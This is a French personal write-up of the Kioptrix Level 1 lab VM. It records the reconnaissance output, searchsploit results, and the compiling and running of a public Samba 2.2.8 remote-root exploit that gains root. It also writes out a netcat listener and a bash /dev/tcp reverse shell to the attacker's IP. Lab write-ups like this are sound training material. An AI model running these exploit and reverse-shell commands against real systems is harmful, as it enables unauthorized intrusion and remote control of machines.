@@ -1,0 +1,188 @@
+Kioptrix_level1
+===============
+Created Saturday 21 October 2017
+
+La clef c'est l'énumération....
+
+Kioptrix 1 :
+root@DebSec:~# nmap -sV -sC 192.168.1.70
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-21 14:30 CEST
+Nmap scan report for 192.168.1.70
+Host is up (0.21s latency).
+Not shown: 562 closed ports, 432 filtered ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
+| ssh-hostkey: 
+|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
+|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
+|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
+|_sshv1: Server supports SSHv1
+80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-title: Test Page for the Apache Web Server on Red Hat Linux
+111/tcp  open  rpcbind     2 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100024  1           1024/tcp  status
+|_  100024  1           1024/udp  status
+139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+|_http-title: 400 Bad Request
+|_ssl-date: 2017-10-21T12:40:54+00:00; +1m50s from scanner time.
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_DES_64_CBC_WITH_MD5
+|     SSL2_RC4_64_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_WITH_MD5
+1024/tcp open  status      1 (RPC #100024)
+MAC Address: 00:0C:29:58:10:21 (VMware)
+
+Host script results:
+|_clock-skew: mean: 1m49s, deviation: 0s, median: 1m49s
+|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 270.24 seconds
+
+On lance enum4linux :
+il nous sort entre autres :
+ ========================================= 
+|    Share Enumeration on 192.168.1.70    |
+ ========================================= 
+WARNING: The "syslog" option is deprecated
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	IPC$            IPC       IPC Service (Samba Server)
+	ADMIN$          IPC       IPC Service (Samba Server)
+
+	Server               Comment
+	---------            -------
+	KIOPTRIX             Samba Server
+
+	Workgroup            Master
+	---------            -------
+	MYGROUP              KIOPTRIX
+
+Donc on va chercher des exploits sur les services.
+
+	OpenSSH v 2.9p2
+	Ports 80 and 443 with Apache 1.3.20 / mod_ssl/2.8.4 / OpenSSL/0.9.6b
+	rpc service
+	Samba service
+	Linux 2.4.9 – 2.4.18
+
+On va commencer par Apache :
+root@DebSec:~# searchsploit apache mod_ssl
+------------------------------------------------------------------------------------------------------------------ ----------------------------------
+ Exploit Title                                                                                                    |  Path
+																												  | (/usr/share/exploitdb/platforms/)
+------------------------------------------------------------------------------------------------------------------ ----------------------------------
+Apache mod_ssl 2.0.x - Remote Denial of Service                                                                   | linux/dos/24590.txt
+Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                        | multiple/dos/21575.txt
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Exploit                                                      | unix/remote/21671.c
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Exploit                                                    | unix/remote/764.c
+Apache mod_ssl OpenSSL < 0.9.6d / < 0.9.7-beta2 - 'openssl-too-open.c' SSL2 KEY_ARG Overflow Exploit              | unix/remote/40347.txt
+------------------------------------------------------------------------------------------------------------------ ----------------------------------
+root@DebSec:~# 
+
+Mais il y a aussi du Samba :
+root@DebSec:~# searchsploit samba 2.2
+------------------------------------------------------------------------------------------------------------------ ----------------------------------
+ Exploit Title                                                                                                    |  Path
+																												  | (/usr/share/exploitdb/platforms/)
+------------------------------------------------------------------------------------------------------------------ ----------------------------------
+(Linux Kernel 2.6) Samba 2.2.8 (Debian / Mandrake) - Share Privilege Escalation                                   | linux/local/23674.txt
+Samba 2.0.x/2.2 - Arbitrary File Creation                                                                         | unix/remote/20968.txt
+Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                                      | osx/remote/9924.rb
+Samba 2.2.2 < 2.2.6 - 'nttrans' Buffer Overflow (Metasploit) (1)                                                  | linux/remote/16321.rb
+Samba 2.2.8 (*BSD x86) - 'trans2open' Overflow Exploit (Metasploit)                                               | bsd_x86/remote/16880.rb
+Samba 2.2.8 (Linux x86) - 'trans2open' Overflow (Metasploit)                                                      | lin_x86/remote/16861.rb
+Samba 2.2.8 (OSX/PPC) - 'trans2open' Overflow (Metasploit)                                                        | osx_ppc/remote/16876.rb
+Samba 2.2.8 (Solaris SPARC) - 'trans2open' Overflow (Metasploit)                                                  | solaris_sparc/remote/16330.rb
+Samba 2.2.8 - (Brute Force Method) Remote Command Execution                                                       | linux/remote/55.c
+Samba 2.2.8 - Remote Code Execution                                                                               | linux/remote/10.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                        | unix/remote/22468.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                        | unix/remote/22469.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                        | unix/remote/22470.c
+Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                        | unix/remote/22471.txt
+Samba 2.2.x - Buffer Overflow                                                                                     | linux/remote/7.pl
+Samba 2.2.x - nttrans Overflow (Metasploit)                                                                       | linux/remote/9936.rb
+Samba SMB 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                       | unix/remote/22356.c
+
+--------------------
+
+
+Juicy info :
+Samba 2.2.8 - Remote Code Execution                                                                               | linux/remote/10.c
+
+On teste :
+Plusieurs manière de le faire la "compliqué" avec msfconsole
+La plus simple :
+on chercher le code, le compiler, et l'exécuter, donc :
+cp /usr/share/exploitdb/platforms/linux/remote/10.c /root/Documents/Challenge/Kioptrix_level1
+une fois copier on le compile :
+gcc 10.c -o exploitSMB
+on le lance :
+root@DebSec:~/Documents/Challenge/Kioptrix_# ./exploitSMB -b 0 -c 192.168.1.73 -C 40 192.168.1.70
+samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)
+
+--------------------
+
++ Bruteforce mode. (Linux)
++ Host is running samba.
++ Worked!
+
+--------------------
+
+*** JE MOET JE MUIL HOUWE
+Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
+uid=0(root) gid=0(root) groups=99(nobody)
+
+Maintenant que l'on est root on va lancer des heures d'investigation pour voir ou se trouve les informations. 
+MAis avant comme on est root on va investguer et lancer et reverse shell :
+sur la machine attaquante :
+nc -lvp 4444
+sur le serveur hacker (IP d emon poste d'attaque 192.168.1.73) :
+bash -i >& /dev/tcp/192.168.1.73/4444 0>&1
+
+
+
+On trouve enfin une bonne info de confirmation dans :
+cat /var/mail/root :
+From: root <root@kioptix.level1>
+Message-Id: <200909261542.n8QFgAZ01831@kioptix.level1>
+To: root@kioptix.level1
+Subject: About Level 2
+Status: O
+
+If you are reading this, you got root. Congratulations.
+Level 2 won't be as easy...
+
+From root  Sat Oct 21 07:03:28 2017
+Return-Path: <root@kioptrix.level1>
+Received: (from root@localhost)
+	by kioptrix.level1 (8.11.6/8.11.6) id v9LB3SS01129
+	for root; Sat, 21 Oct 2017 07:03:28 -0400
+Date: Sat, 21 Oct 2017 07:03:28 -0400
+From: root <root@kioptrix.level1>
+Message-Id: <201710211103.v9LB3SS01129@kioptrix.level1>
+To: root@kioptrix.level1
+Subject: LogWatch for kioptrix.level1
+
+Bingo; Bim, saperlipopete !!! Level = ça c'est fait !!! avec Exploit Samba...
+On pouvait aussi le faire avec l'exploit du Apache mod_ssl, mais il faut mettre à jour l'exploit avec une nouvelle lib, et j'ai la flemme.
